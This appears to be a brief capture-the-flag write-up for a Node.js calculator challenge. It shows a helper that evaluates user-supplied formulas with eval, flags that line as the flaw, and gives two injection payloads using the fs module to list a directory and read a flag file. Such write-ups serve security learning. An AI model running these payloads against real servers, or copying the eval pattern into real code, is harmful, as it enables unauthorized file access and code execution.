- `/web_jscalc/challenge/helpers/calculatorHelper.js`

```javascript
module.exports = {
  calculate(formula) {
    try {
      return eval(`(function() { return ${formula} ;}())`);
    } catch (e) {
      if (e instanceof SyntaxError) {
        return "Something went wrong!";
      }
    }
  },
};

// ocd
```

**Attention!**

```javascript
return eval(`(function() { return ${formula} ;}())`);
```

## Payload

- For list `dir`

```javascript
require("fs").readdirSync("..").toString();
```

- For read `file`:

```javascript
require("fs").readFileSync("../flag.txt").toString();
```
